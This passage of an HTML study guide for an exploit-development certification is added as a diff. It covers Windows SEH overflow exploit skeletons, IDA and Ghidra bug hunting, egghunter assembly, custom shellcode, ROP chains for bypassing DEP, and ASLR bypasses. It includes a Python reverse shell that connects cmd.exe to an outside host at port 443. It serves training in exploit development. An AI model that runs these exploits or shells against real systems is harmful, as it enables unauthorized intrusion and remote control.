+# shellcode goes after the SEH record (in the NOP sled / extra buffer space)
+shellcode = b"\x90" * 16 + b"..."  # replace ... with msfvenom output
+
+buf  = b"A" * OFFSET
+buf += nseh
+buf += seh
+buf += shellcode
+
+with socket.create_connection((TARGET, PORT)) as s:
+    s.send(b"GET /" + buf + b" HTTP/1.0\r\n\r\n")</code></pre>
+
+
+              <h2 id="osed-reversing">7. Reverse Engineering (IDA Pro &amp; Ghidra)</h2>
+              <p>You receive closed-source binaries, so static reverse engineering is how you find the bug. IDA Pro is the course tool; Ghidra is a capable free alternative with an integrated decompiler.</p>
+              <h3 id="osed-ida-interface">7.1 IDA Pro Interface &amp; Basics</h3>
+              <p>The main views are IDA View-A (disassembly), Hex View, Pseudocode (F5 in Hex-Rays), Structures, Enums, and Imports/Exports. Key navigation: <kbd>G</kbd> jumps to an address; <kbd>X</kbd> shows cross-references (who calls this?); <kbd>N</kbd> renames; <kbd>;</kbd> adds a comment; <kbd>Space</kbd> toggles graph/linear view. Search with <kbd>Alt</kbd>+<kbd>T</kbd> (text in disassembly), <kbd>Alt</kbd>+<kbd>B</kbd> (byte opcodes), or <kbd>Ctrl</kbd>+<kbd>F</kbd> (filter names). The Xrefs from/to graph (View &rarr; Graphs) shows call depth, and the proximity graph highlights closely related functions.</p>
+              <pre><code class="language-powershell"># Static address to runtime address (IDA imagebase may differ from ASLR base):
+# runtime_addr = module_base_at_runtime + (IDA_addr - IDA_imagebase)
+# IDA imagebase: Edit -&gt; Segments -&gt; Rebase program OR check in IDA: "0x400000" default
+
+# In WinDbg: map an IDA static address to a live breakpoint
+lm m targetapp              # get runtime base: e.g. 0x00400000
+? 0x00400000 + (0x401234 - 0x400000)   # -&gt; compute runtime address
+bp &lt;result_addr&gt;</code></pre>
+              <h3 id="osed-ida-workflow">7.2 IDA Pro Bug-Finding Workflow</h3>
+              <p>Start at the entry points for attacker data &mdash; <code>recv</code>, <code>WSARecv</code>, <code>ReadFile</code>, <code>fread</code>, file parsers &mdash; via the Imports tab; use <kbd>X</kbd> to trace callers. Follow the tainted buffer downstream through cross-references and rename functions as you understand them (<code>sub_401234</code> &rarr; <code>parse_header</code>). Audit callers for unbounded copies: <code>strcpy</code>, <code>strcat</code>, <code>sprintf</code>, <code>memcpy</code>/<code>CopyMemory</code> with attacker-controlled length, and <code>memmove</code>. The Hex-Rays decompiler (F5) makes complex loops readable; watch for patterns like <code>while(*src++) *dst++ = *src</code> without length checks. The graph view helps follow control flow and protocol state machines.</p>
+              <h3 id="osed-ida-sync">7.3 Sync IDA with WinDbg</h3>
+              <p>Compute <code>runtime_addr = runtime_base + (IDA_addr - IDA_imagebase)</code> and set matching breakpoints in both tools to walk the program in parallel. To watch the raw input buffer as the server receives it, hook <code>recv</code> in WinDbg: <code>poi(esp+8)</code> is the third argument to <code>recv()</code> &mdash; the buffer pointer.</p>
+              <pre><code class="language-powershell"># In IDA Pro: install the "sync" plugin or use pykd to bridge addresses.
+# Manual method (always works):
+# 1. In WinDbg, get the runtime base of the module:
+lm m targetapp     # e.g. base = 0x00500000
+
+# 2. In IDA, rebase to match (Edit -&gt; Segments -&gt; Rebase, enter 0x00500000)
+#    OR use the formula: IDA_addr + (runtime_base - IDA_imagebase)
+
+# 3. Hook recv in WinDbg to see the raw input buffer as received:
+bp ws2_32!recv "da poi(esp+8) L?400; g"
+# poi(esp+8) = third argument to recv() = the buffer pointer</code></pre>
+              <h3 id="osed-ghidra-overview">7.4 Ghidra Overview</h3>
+              <p>Ghidra is NSA&rsquo;s free open-source reverse engineering framework. It provides disassembly, a built-in decompiler, scripting in Java/Python, and a GUI comparable to IDA Pro &mdash; a strong free alternative for EXP-301 targets. Import the binary (File &rarr; Import File &mdash; Ghidra auto-detects format and architecture), run auto-analysis with default settings to resolve imports and identify functions, then work in the Listing (disassembly), Decompiler (right pane, auto-synced), Symbol Tree, and References views. Navigation: <kbd>G</kbd> goes to address/label; <kbd>L</kbd> renames; <kbd>;</kbd> comments; <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>F</kbd> searches text; middle-click a function shows callers/callees.</p>
+              <h3 id="osed-ghidra-workflow">7.5 Ghidra Workflow &amp; Scripting</h3>
+              <pre><code class="language-bash"># Launch Ghidra from command line
+ghidraRun        # opens GUI
+
+# Scripting: run a Python script in Ghidra's Script Manager (Window -&gt; Script Manager)
+# Example: find all calls to recv() in the binary
+from ghidra.program.model.symbol import RefType
+recv_sym = getSymbol("recv", currentProgram.getGlobalNamespace())
+if recv_sym:
+    for ref in recv_sym.getReferences():
+        print(f"Call to recv @ {ref.getFromAddress()}")</code></pre>
+              <table class="custom-table">
+                <thead><tr><th>Task</th><th>IDA Pro</th><th>Ghidra</th></tr></thead>
+                <tbody>
+                  <tr><td>Go to address</td><td>G</td><td>G</td></tr>
+                  <tr><td>Cross-references</td><td>X</td><td>Ctrl+Shift+F (or right-click &rarr; References)</td></tr>
+                  <tr><td>Rename</td><td>N</td><td>L</td></tr>
+                  <tr><td>Decompile</td><td>F5 (Hex-Rays)</td><td>Auto-synced decompiler pane</td></tr>
+                  <tr><td>Search bytes</td><td>Alt+B</td><td>Search &rarr; Memory (S)</td></tr>
+                  <tr><td>Search text</td><td>Alt+T</td><td>Ctrl+Shift+F</td></tr>
+                  <tr><td>Add comment</td><td>;</td><td>;</td></tr>
+                  <tr><td>Graph view</td><td>Space</td><td>Graph (right-click &rarr; Show in Function Graph)</td></tr>
+                  <tr><td>Scripting</td><td>IDAPython</td><td>Ghidra Script (Java/Python)</td></tr>
+                  <tr><td>Cost</td><td>Paid</td><td>Free (NSA/open-source)</td></tr>
+                </tbody>
+              </table>
+              <h3 id="osed-re-protocol">7.6 Protocol Reverse Engineering Workflow</h3>
+              <p>The EXP-301 course reverses the IBM Tivoli FastBackServer protocol; the workflow applies to any custom binary protocol. Hook <code>ws2_32!recv</code> in WinDbg and dump the buffer on every call to see the raw bytes the server receives. Correlate with IDA: find the function calling <code>recv</code>, rename it <code>network_recv</code>, and follow data flow into parsing routines. Identify header fields by spotting length extractions (e.g. <code>mov eax, [buf+4]</code> often pulls a 4-byte length at offset 4) and any checksum/magic validation. Reverse the checksum algorithm and reimplement it in Python so your exploit packets pass validation. The vulnerability is usually an attacker-controlled length flowing into a <code>memcpy</code> / <code>CopyMemory</code> with a fixed destination buffer.</p>
+              <pre><code class="language-python"># Re-implement a reversed checksum in Python (example: additive XOR checksum)
+def calc_checksum(data: bytes) -&gt; int:
+    cksum = 0
+    for b in data:
+        cksum = ((cksum &lt;&lt; 1) | (cksum &gt;&gt; 31)) &amp; 0xFFFFFFFF  # ROL 1
+        cksum ^= b
+    return cksum &amp; 0xFF
+
+def build_packet(opcode: int, payload: bytes) -&gt; bytes:
+    header_len = 0x10
+    total_len  = header_len + len(payload)
+    pkt  = b"\x01\x00"               # magic
+    pkt += opcode.to_bytes(2, "little")
+    pkt += total_len.to_bytes(4, "little")
+    pkt += b"\x00" * 4               # reserved
+    pkt += calc_checksum(pkt[:12]).to_bytes(4, "little")
+    pkt += payload
+    return pkt</code></pre>
+
+              <h2 id="osed-egghunter">8. Egghunters &amp; Space Restrictions</h2>
+              <p>When the buffer after EIP or nSEH is too small for full shellcode, drop a tiny egghunter there that scans memory for an 8-byte tag prefixing your real shellcode in a larger buffer, then jumps to it.</p>
+              <h3 id="osed-egg-when">8.1 When to Use an Egghunter</h3>
+              <p>Whenever the buffer immediately after EIP or <code>nSEH</code> is too small for full shellcode (under ~400 bytes), use a tiny egghunter there. The egghunter scans the entire process memory for a known 8-byte tag (the &ldquo;egg&rdquo;, e.g. <code>w00tw00t</code>) prefixing your real shellcode, then jumps to it. Deliver the real shellcode &mdash; arbitrarily large &mdash; in any other reachable buffer (a different field in the same protocol packet, a previous request, or the heap).</p>
+              <h3 id="osed-egg-partial-eip">8.2 Partial EIP Overwrite</h3>
+              <p>If a buffer overflow is terminated by a null byte before you can write a full 4-byte EIP, you can still overwrite the low bytes. A 1- or 2-byte partial overwrite can redirect EIP to a nearby address within the same page (where the upper bytes already point to the correct module &mdash; no relocation needed).</p>
+              <pre><code class="language-python"># Partial overwrite: change only the low byte of EIP
+# Current EIP: 0x00401070  -&gt; overwrite low byte to 0x90 -&gt; 0x00401090
+# That address must be within the current module (no relocation needed)
+buf = b"A" * offset + b"\x90"   # only 1 byte after the padding</code></pre>
+              <h3 id="osed-egg-conditional">8.3 Conditional Jumps &amp; Assembly Tricks</h3>
+              <p>When the space between EIP and a null byte is only 5&ndash;10 bytes, you need creative assembly to break out: short JMP backward into a large preceding A-buffer, change the HTTP method to a different field that allows more bytes, or island-hop across multiple fields (small field jumps to medium field, medium holds the egghunter stub, real shellcode lives in a large field prefixed with the egg).</p>
+              <pre><code class="language-nasm">; Trick 1: conditional short jump into a larger A-buffer that precedes EIP
+; nSEH or EIP position has 4 bytes -&gt; use JMP SHORT backward
+db 0xeb, 0xf0        ; JMP -16 (jump backward into the A-buffer)
+db 0x90, 0x90
+
+; Trick 2: change the HTTP method to GET/POST to fit within a different field
+; e.g. the URL field allows 500 bytes; the User-Agent allows 300 bytes
+
+; Trick 3: island hop across multiple fields
+; Field 1 (small): short JMP to Field 2
+; Field 2 (medium): egghunter stub
+; Real shellcode in Field 3 (large), prefixed with egg</code></pre>
+              <h3 id="osed-egg-heap">8.4 Heap &amp; Alternative Buffers</h3>
+              <p>Application data often lands in the heap. Use WinDbg to watch for large heap allocations (<code>!heap -stat</code>, <code>!heap -flt s 1000</code> filters to allocations &ge; 0x1000 bytes). Before sending the egghunter exploit, send the tagged shellcode in a separate earlier request that lands in a large heap or stack buffer. The 8-byte egg (<code>w00tw00t</code>) prefixes the real shellcode; the egghunter finds it by scanning memory linearly.</p>
+              <h3 id="osed-egg-keystone">8.5 NtAccessCheck Egghunter (Keystone)</h3>
+              <p>The course-taught egghunter uses <code>NtAccessCheckAndAuditAlarm</code> (syscall <code>0x02</code> on Windows 7/10 x86) to safely probe each page &mdash; if the page is not readable, the syscall sets the error and continues rather than crashing.</p>
+              <pre><code class="language-python">from keystone import *
+
+EGGHUNTER_ASM = """
+    loop_inc_page:
+        or  dx, 0xfff           ; round up to next page boundary
+    loop_inc_one:
+        inc edx                 ; advance one byte
+    is_accessible:
+        push edx                ; save pointer
+        push 0x02               ; NtAccessCheckAndAuditAlarm syscall number
+        pop  eax
+        int  0x2e               ; call the syscall
+        cmp  al, 0x05           ; STATUS_ACCESS_VIOLATION?
+        pop  edx
+        je   loop_inc_page      ; inaccessible page -&gt; skip to next
+    is_egg:
+        mov  eax, 0x74303077    ; "w00t" in little-endian
+        mov  edi, edx
+        scasd                   ; compare [edi] to EAX, advance EDI
+        jne  loop_inc_one       ; not the egg tag -&gt; keep searching
+        scasd                   ; check second copy of the egg
+        jne  loop_inc_one
+    found_egg:
+        jmp  edi                ; jump into the shellcode after the egg
+"""
+
+ks = Ks(KS_ARCH_X86, KS_MODE_32)
+egghunter, _ = ks.asm(EGGHUNTER_ASM)
+egghunter_bytes = bytes(egghunter)
+print(f"Egghunter: {len(egghunter_bytes)} bytes")
+print("".join(f"\\x{b:02x}" for b in egghunter_bytes))
+
+EGG = b"w00tw00t"   # 8 bytes (egg repeated twice)
+# Build the trigger (small buffer): padding + EIP/nSEH redirect + egghunter
+# Build the staged payload (large buffer): EGG + shellcode</code></pre>
+              <h3 id="osed-egg-seh">8.6 SEH-Based Egghunter (Portable)</h3>
+              <p>The basic syscall egghunter can fault on certain Windows versions. The SEH-based variant installs a local exception handler so access violations during the scan are caught and execution continues &mdash; making it portable from Windows XP through Windows 10.</p>
+              <pre><code class="language-python">SEH_EGGHUNTER_ASM = """
+    start:
+        jmp  get_seh_address     ; jump to get the SEH handler address
+    egghunter:
+        pop  ecx                 ; pop SEH address into ECX
+        mov  [ecx+0x4], ecx     ; install SEH handler (store addr in record)
+        or   ecx, 0xfff          ; ECX -&gt; top of current page
+    next_addr:
+        inc  ecx                 ; advance to next byte
+        lea  eax, [ecx+0x4]     ; EAX = address in next page
+        xchg eax, esp            ; swap SEH frame pointer with stack
+        sub  esp, 0x208          ; reserve SEH frame space
+    try_access:
+        mov  eax, 0x74303077    ; "w00t"
+        cmp  dword ptr [ecx], eax   ; check for first egg half
+        jne  next_addr
+        cmp  dword ptr [ecx+4], eax ; check for second egg half
+        jne  next_addr
+    found_shellcode:
+        jmp  ecx                 ; jump into shellcode after the egg
+    get_seh_address:
+        call egghunter           ; push EIP (SEH address), jump back
+"""
+# Result: ~60 bytes; works on Windows 7, 8.1, 10 (all x86)</code></pre>
+              <h3 id="osed-egg-win10">8.7 Porting to Windows 10</h3>
+              <p>Windows 10 may shift some syscall numbers. Verify <code>NtAccessCheckAndAuditAlarm</code> by unassembling <code>ntdll!NtAccessCheckAndAuditAlarm</code> in WinDbg and reading the <code>MOV EAX, X</code> at the top of the stub. The SEH-based egghunter sidesteps this entirely (no syscall number dependency) &mdash; prefer it for exam targets running Windows 10, and test against both Windows 7 and 10 during development.</p>
+
+
+              <h2 id="osed-custom-shellcode">9. Creating Custom Shellcode</h2>
+              <p>Encoders can&rsquo;t always avoid every bad character or fit a tight space. OSED teaches hand-written shellcode that resolves Win32 APIs at runtime from the PEB &mdash; portable across Windows versions and free of hardcoded addresses.</p>
+              <h3 id="osed-shellcode-syscall-problem">9.1 The System Call Problem</h3>
+              <p>You cannot hardcode syscall numbers in portable shellcode &mdash; they differ between Windows versions. Instead, resolve Win32 API addresses at runtime by navigating PEB &rarr; Ldr &rarr; module list &rarr; PE Export Address Table.</p>
+              <h3 id="osed-peb-walk">9.2 Finding kernel32.dll via the PEB</h3>
+              <p>Read the PEB at <code>fs:[0x30]</code>, follow <code>PEB-&gt;Ldr</code> at offset <code>0x0C</code>, then walk <code>InMemoryOrderModuleList</code> at <code>+0x14</code> to find kernel32&rsquo;s <code>DllBase</code> without a fixed address. On Windows 7/10 the order is ntdll &rarr; the app &rarr; kernel32 &mdash; walk to the third entry, then read <code>+0x10</code> for the base.</p>
+              <pre><code class="language-nasm">; fs:[0x30] -&gt; PEB
+; PEB+0x0C -&gt; PEB_LDR_DATA*
+; PEB_LDR_DATA+0x14 -&gt; InMemoryOrderModuleList (doubly-linked, first entry = self)
+; Each LIST_ENTRY+0x10 -&gt; DllBase of the module
+; Walk to 3rd entry to reach kernel32.dll (ntdll=1st, app=2nd, kernel32=3rd on Win7-10)
+
+find_kernel32:
+    mov  eax, fs:[0x30]      ; EAX = PEB
+    mov  eax, [eax+0x0C]     ; EAX = PEB-&gt;Ldr
+    mov  eax, [eax+0x14]     ; EAX = first InMemoryOrderModuleList entry (Flink)
+    mov  eax, [eax]          ; EAX = second entry (skip self)
+    mov  eax, [eax]          ; EAX = third entry (kernel32 on most targets)
+    mov  eax, [eax+0x10]     ; EAX = DllBase of kernel32.dll</code></pre>
+              <h3 id="osed-eat-resolution">9.3 Resolving Symbols via the Export Address Table</h3>
+              <p>Parse kernel32&rsquo;s PE Export Directory to find any exported function by hashing its name. This avoids hardcoded addresses and works across patch levels.</p>
+              <pre><code class="language-nasm">; Given EAX = kernel32 DllBase:
+; PE Header: [EAX+0x3C] -&gt; offset to PE signature
+; PE+0x78 -&gt; RVA of Export Directory
+; Export Dir+0x18 -&gt; NumberOfNames
+; Export Dir+0x1C -&gt; AddressOfFunctions  (EAT: array of RVAs)
+; Export Dir+0x20 -&gt; AddressOfNames      (ENT: array of name RVAs)
+; Export Dir+0x24 -&gt; AddressOfNameOrdinals (EOT: name-&gt;ordinal mapping)
+
+find_function:
+    ; EBP = DllBase, ECX = target hash
+    mov  edx, [ebp+0x3C]        ; RVA of PE header
+    mov  edx, [ebp+edx+0x78]    ; RVA of Export Directory
+    add  edx, ebp                ; VA of Export Directory
+    mov  esi, [edx+0x20]        ; RVA of AddressOfNames
+    add  esi, ebp                ; VA of AddressOfNames
+    xor  ecx, ecx
+next_function_loop:
+    inc  ecx
+    lodsd                        ; EAX = RVA of next name, ESI advances
+    add  eax, ebp                ; VA of function name string
+    call compute_hash            ; hash it (see below)
+    cmp  eax, [esp+0x28]        ; compare to target hash
+    jne  next_function_loop
+    ; found: get address from EAT using the ordinal
+    mov  esi, [edx+0x24]        ; RVA of AddressOfNameOrdinals
+    add  esi, ebp
+    mov  cx, [esi+ecx*2-2]     ; ordinal of matched name
+    mov  esi, [edx+0x1C]       ; RVA of AddressOfFunctions
+    add  esi, ebp
+    mov  edx, [esi+ecx*4]      ; RVA of function
+    add  edx, ebp               ; VA of function -&gt; EDX
+    ret</code></pre>
+              <h3 id="osed-name-hash">9.4 Computing Function Name Hashes</h3>
+              <p>Pre-compute the ROR-13 hash of each function name you need (<code>LoadLibraryA</code>, <code>GetProcAddress</code>, <code>VirtualAlloc</code>, etc.) and bake the hash into the shellcode. The runtime resolver matches hashes instead of strings, keeping the payload small.</p>
+              <pre><code class="language-python"># Compute the hash used to find a function by name (ROR-13 variant common in shellcode)
+import struct
+
+def ror32(val, bits):
+    return ((val &gt;&gt; bits) | (val &lt;&lt; (32 - bits))) &amp; 0xFFFFFFFF
+
+def hash_name(name: str) -&gt; int:
+    h = 0
+    for c in name + "\x00":    # include null terminator
+        h = ror32(h, 13)
+        h = (h + ord(c)) &amp; 0xFFFFFFFF
+    return h
+
+# Pre-compute hashes for the functions you need
+for fn in ["LoadLibraryA", "GetProcAddress", "VirtualAlloc",
+           "WinExec", "WSAStartup", "WSASocket", "WSAConnect", "CreateProcessA"]:
+    print(f"  0x{hash_name(fn):08x}  {fn}")</code></pre>
+              <h3 id="osed-null-free-pic">9.5 NULL-Free Position-Independent Code</h3>
+              <p>Avoid <code>\x00</code> in every byte of shellcode (most protocols null-terminate). Replace <code>mov eax, 0x00000001</code> with <code>xor eax,eax; inc eax</code>. To push <code>"calc\x00"</code> null-free, first <code>xor ecx,ecx; push ecx</code> for the terminator, then <code>push 0x636c6163</code>. Position-independence comes from the CALL/POP &ldquo;delta&rdquo; trick: <code>CALL</code> to the next label pushes EIP; <code>POP ESI</code> recovers the runtime address; subtract a small constant to find the shellcode base.</p>
+              <pre><code class="language-nasm">; Avoid \x00 bytes in the shellcode (most protocols null-terminate)
+; BAD:  mov eax, 0x00000001  ; contains \x00 bytes
+; GOOD: xor eax, eax  /  inc eax   ; 0x00000001 without null bytes
+; BAD:  push 0x00636c6163 ("calc" with leading null)
+; GOOD: xor ecx, ecx  /  push ecx  /  push 0x636c6163  (null terminator first)
+
+; Position-independent: use CALL/POP to get runtime EIP (delta technique)
+    call  delta
+delta:
+    pop   esi                ; ESI = runtime address of 'delta' label
+    sub   esi, 5             ; ESI = start of shellcode
+    ; Now use [esi + offset_to_data] for all data references
+
+; String "calc" pushed null-free onto the stack:
+    xor   ecx, ecx
+    push  ecx                ; null terminator
+    push  0x636c6163         ; "clac" -&gt; memory is "calc\x00"
+    mov   eax, esp           ; EAX -&gt; "calc"</code></pre>
+              <h3 id="osed-revshell-ws2">9.6 Reverse Shell via ws2_32.dll</h3>
+              <p>The custom reverse shell resolves ws2_32 functions at runtime via the EAT technique, then chains <code>WSAStartup &rarr; WSASocket &rarr; WSAConnect &rarr; CreateProcessA</code> with stdin/stdout/stderr wired to the socket.</p>
+              <pre><code class="language-python"># High-level Python equivalent of the shellcode logic:
+import socket, subprocess, struct
+
+LHOST = "10.10.10.10"
+LPORT = 443
+
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((LHOST, LPORT))
+    subprocess.call(
+        ["cmd.exe"],
+        stdin=s, stdout=s, stderr=s
+    )</code></pre>
+              <pre><code class="language-nasm">; Assembly layout (simplified):
+; 1. Call LoadLibraryA("ws2_32") to load the DLL
+; 2. Resolve WSAStartup, WSASocket, WSAConnect, CreateProcessA via EAT
+; 3. WSAStartup(0x0202, &amp;wsadata)
+; 4. WSASocket(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, 0, 0, 0) -&gt; sock_fd in EAX
+; 5. Build a SOCKADDR_IN struct: sin_family=2, sin_port=htons(443), sin_addr=inet_addr(LHOST)
+; 6. WSAConnect(sock_fd, &amp;sockaddr, sizeof(sockaddr), 0, 0, 0, 0)
+; 7. Build a STARTUPINFO with hStdInput/Output/Error all = sock_fd
+; 8. CreateProcessA(0, "cmd.exe", 0, 0, TRUE, 0, 0, 0, &amp;si, &amp;pi)</code></pre>
+
+              <h2 id="osed-dep-bypass">10. Bypassing DEP with ROP</h2>
+              <p>DEP marks the stack non-executable, so direct shellcode jumps fault. ROP chains existing executable code snippets ending in <code>RET</code> to call a Win32 API that makes memory executable, then returns into shellcode.</p>
+              <h3 id="osed-dep-theory">10.1 DEP Theory &amp; Windows Defender Exploit Guard</h3>
+              <p>Data Execution Prevention marks all writable memory pages (stack, heap) non-executable, so a jump to shellcode on the stack faults instead of executing. Windows Defender Exploit Guard enforces DEP at the process level; confirm it from WinDbg with <code>!vprot esp</code> &mdash; a page protection of <code>PAGE_READWRITE</code> (no execute) means DEP is on.</p>
+              <pre><code class="language-powershell"># Confirm DEP status for a process from WinDbg
+!vprot esp       # page at ESP should show PAGE_READWRITE (not executable)
+# If PAGE_EXECUTE_READWRITE -&gt; DEP is off for this process
+# !address esp -&gt; shows "Protect: 4" (RW, no execute) -&gt; DEP is on</code></pre>
+              <h3 id="osed-rop-origins">10.2 Return-Oriented Programming Origins &amp; Evolution</h3>
+              <p>ROP was introduced by Hovav Shacham in 2007. Instead of injecting new code, it chains existing executable code snippets (&ldquo;gadgets&rdquo;) ending in <code>RET</code>. Each RET pops the next gadget address from the stack, so the attacker&rsquo;s data on the stack drives execution forward through a series of short native instructions. The goal: call a Win32 API that marks a memory region executable, then return into shellcode.</p>
+              <h3 id="osed-rop-gadget-find">10.3 Gadget Discovery</h3>
+              <p>Enumerate gadgets from non-ASLR modules with <code>rp++</code> (fast, runs on the Windows target) or <code>ropper</code> (Kali, supports auto-chains). For surgical searches, drive WinDbg from pykd to walk a module&rsquo;s memory looking for a specific byte sequence.</p>
+              <pre><code class="language-bash"># RP++: fast gadget enumeration (run on Windows target)
+rp-win-x86.exe -f target.dll --rop 5 --unique &gt; gadgets.txt
+rp-win-x86.exe -f kernel32.dll --rop 3 --unique | grep "pop eax"
+
+# Ropper (Kali)
+ropper --file target.dll --search "pop eax; ret"
+ropper --file target.dll --chain "virtualalloc"  # auto-chain attempt</code></pre>
+              <pre><code class="language-python"># pykd gadget finder: find all "jmp esp" in a module
+import pykd
+
+module = "target"
+base = pykd.module(module).begin()
+size = pykd.module(module).size()
+
+for addr in range(base, base + size - 1):
+    try:
+        b = pykd.loadBytes(addr, 2)
+        if b[0] == 0xff and b[1] == 0xe4:
+            print(f"JMP ESP @ 0x{addr:08x}")
+    except:
+        pass</code></pre>
+              <h3 id="osed-rop-virtualalloc">10.4 DEP Bypass via VirtualAlloc</h3>
+              <p>The EXP-301 course bypass calls <code>VirtualAlloc</code> to allocate a fresh <code>PAGE_EXECUTE_READWRITE</code> region, copies shellcode there, and returns into it. The ROP chain must arrange all five arguments before the call; a <code>PUSHAD</code> gadget is the idiomatic way to batch the call frame from registers in one shot.</p>
+              <pre><code class="language-python">import struct
+
+def p(x): return struct.pack("&lt;I", x)
+
+# Target: VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
+# Arguments:  0=NULL (auto), 0x201=size, 0x1000=MEM_COMMIT, 0x40=PAGE_EXECUTE_READWRITE
+# After VirtualAlloc returns: EAX = new executable region -&gt; copy shellcode there -&gt; jmp EAX
+
+GADGET_POP_EAX  = 0x10015f82   # pop eax; ret
+GADGET_POP_EBX  = 0x10022b10   # pop ebx; ret
+GADGET_POP_ECX  = 0x100231f4   # pop ecx; ret
+GADGET_POP_EDX  = 0x1002348f   # pop edx; ret
+GADGET_PUSHAD   = 0x10032f72   # pushad; ret   (push all regs in one shot)
+GADGET_XCHG_EAX_ESP = 0x1003f1a0  # xchg eax, esp; ret  (stack pivot if needed)
+VIRTUALALLOC_IAT = 0x10082130   # IAT entry pointing to VirtualAlloc
+
+rop  = b""
+# Step 1: get VirtualAlloc address from IAT (dereference the IAT pointer)
+rop += p(GADGET_POP_EAX)       # pop eax; ret
+rop += p(VIRTUALALLOC_IAT)     # eax = IAT address
+rop += p(0x10015f90)           # mov eax, [eax]; ret  (deref IAT to get VA address)
+
+# Step 2: prepare arguments in registers (course uses PUSHAD technique)
+# EAX = VirtualAlloc addr, EBX = 0x201 (size), ECX = 0x40 (protect),
+# EDX = 0x1000 (type), ESI = return-to-shellcode addr, EDI = ret gadget
+# Then PUSHAD creates the stack frame for the call
+
+rop += p(GADGET_POP_EBX)
+rop += p(0x00000201)            # dwSize
+rop += p(GADGET_POP_ECX)
+rop += p(0x00000040)            # flProtect = PAGE_EXECUTE_READWRITE
+rop += p(GADGET_POP_EDX)
+rop += p(0x00001000)            # flAllocationType = MEM_COMMIT
+# ... continue building chain per target gadget availability
+rop += p(GADGET_PUSHAD)        # push all registers -&gt; forms call stack
+# On return from VirtualAlloc, EAX = new buffer; copy shellcode there and jump</code></pre>
+              <h3 id="osed-rop-wpm">10.5 DEP Bypass via WriteProcessMemory</h3>
+              <p>An alternative when allocating new memory is awkward: use <code>WriteProcessMemory</code> to overwrite a read-execute section of the binary with your shellcode. This bypasses DEP without needing a new allocation &mdash; the target region is already executable.</p>
+              <pre><code class="language-python"># WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpBytesWritten)
+# hProcess = 0xFFFFFFFF (current process pseudo-handle)
+# lpBaseAddress = address in a code section (already executable)
+# lpBuffer = address of shellcode on stack
+# nSize = len(shellcode)
+# After call: jump to lpBaseAddress
+
+# The course demo: the shellcode is encoded (to pass bad-char checks);
+# the ROP chain calls WriteProcessMemory to decode+copy it into a code section,
+# then ret into that section.</code></pre>
+              <h3 id="osed-rop-decoder">10.6 ROP Decoder &amp; Encoding Automation</h3>
+              <p>When bad characters exclude most bytes from raw shellcode, encode the shellcode and use ROP gadgets to decode it into executable memory before jumping in. The decoder can be pure ROP (MOV/XOR/ADD gadgets) or a small decode stub that runs after DEP is defeated. Full automation generates the ROP chain dynamically based on available gadgets, handles variable offsets, and encodes the shellcode in one pass.</p>
+              <pre><code class="language-python"># XOR encode shellcode with key 0x41, then decode in the ROP chain
+key = 0x41
+shellcode_raw = b"\x90\x90..."  # original shellcode
+
+encoded = bytes(b ^ key for b in shellcode_raw)
+
+# The ROP decoder: for each byte, XOR with 0x41 and write to the destination
+# This can be done in pure ROP (using MOV/XOR/ADD gadgets) or via a small
+# decode stub that runs after DEP is defeated (write to RWX region first).
+
+# Full automation: script generates the ROP chain dynamically based on
+# available gadgets, handles variable offsets, and encodes shellcode.</code></pre>
+
+              <h2 id="osed-aslr-bypass">11. Bypassing ASLR</h2>
+              <p>ASLR randomizes module bases each load. Bypass with a non-ASLR module if one exists, leak a runtime pointer to recompute the base, or use a partial overwrite that only changes the low bytes of an address within the same page.</p>
+              <h3 id="osed-aslr-theory">11.1 ASLR Theory</h3>
+              <p>ASLR randomizes module base addresses at each load (system boot or process start). The entropy is limited &mdash; about 8 bits on 32-bit Windows 10 &mdash; so roughly 256 possible positions exist for any given DLL base. Brute force is rarely the right answer, though; more surgical bypasses are the standard approach.</p>
+              <h3 id="osed-aslr-nonaslr">11.2 Non-ASLR Modules (Easiest Bypass)</h3>
+              <p>If any loaded DLL was built without <code>/DYNAMICBASE</code>, take all addresses (JMP ESP, ROP gadgets, API pointers) from it. This is the simplest and most common path &mdash; many older third-party DLLs and COM objects are compiled without ASLR. mona&rsquo;s <code>modules</code> command tabulates this; compare bases across reboots in <code>lm</code> to confirm.</p>
+              <pre><code class="language-powershell">!py mona modules    # table: ASLR=True/False per module
+lm                  # check whether bases change across reboots
+# If ANY loaded module has ASLR=False, use addresses (gadgets, IAT) from that module.
+# Many older third-party DLLs and COM objects are compiled without /DYNAMICBASE.</code></pre>
+              <h3 id="osed-aslr-leak">11.3 Information Leaks for ASLR Bypass</h3>
+              <p>If every loaded module is ASLR-enabled, leak a runtime pointer via a memory disclosure (format string, over-read, heap info leak), then compute the module base at exploit time and rebase every gadget address.</p>
+              <pre><code class="language-python"># Example: format string leaks a stack pointer belonging to a module
+# The server returns 4 bytes at stack offset N when we send %N$x
+# We see: 0x6f2a1234 -- subtract the known offset-within-module (from IDA)
+# to get the module base.
+
+def rebase(leaked_addr: int, leak_offset_in_module: int) -&gt; int:
+    """Compute module base from a leaked pointer."""
+    return leaked_addr - leak_offset_in_module
+
+# Then: gadget_runtime = module_base + (gadget_IDA_addr - IDA_imagebase)
+def gadget_addr(base: int, gadget_static: int, imagebase: int = 0x400000) -&gt; int:
+    return base + (gadget_static - imagebase)</code></pre>
+              <h3 id="osed-aslr-partial">11.4 Partial Overwrite</h3>
+              <p>Overwrite only the low 1&ndash;2 bytes of a saved pointer; the high bytes stay valid (already pointing into the correct module), and only the page-relative offset changes. Useful when a null byte terminates your overflow before you can write a full 4-byte address, but you can still write 1&ndash;2 non-null bytes. Requires that your target address shares the high bytes with the original value &mdash; both within the same 64&nbsp;KB or 16&nbsp;MB aligned region.</p>
+              <h3 id="osed-aslr-hidden">11.5 Finding Hidden Gems &amp; Symbol Resolution</h3>
+              <p>The course introduces <code>FXCLI_DebugDispatch</code> as an example of hidden debugging functions still present in a release binary. Hunt for similar artifacts: search IDA strings for &ldquo;debug&rdquo;, &ldquo;test&rdquo;, &ldquo;diag&rdquo;, &ldquo;internal&rdquo;; check the <code>.data</code> section for function pointer tables (vtables, dispatch tables); and enumerate exported symbols with wildcards in WinDbg. A dispatch table that takes a command code may contain unexported functions with useful primitives (e.g. arbitrary read/write).</p>
+              <pre><code class="language-powershell"># In IDA: search for strings containing "debug", "test", "diag", "internal"
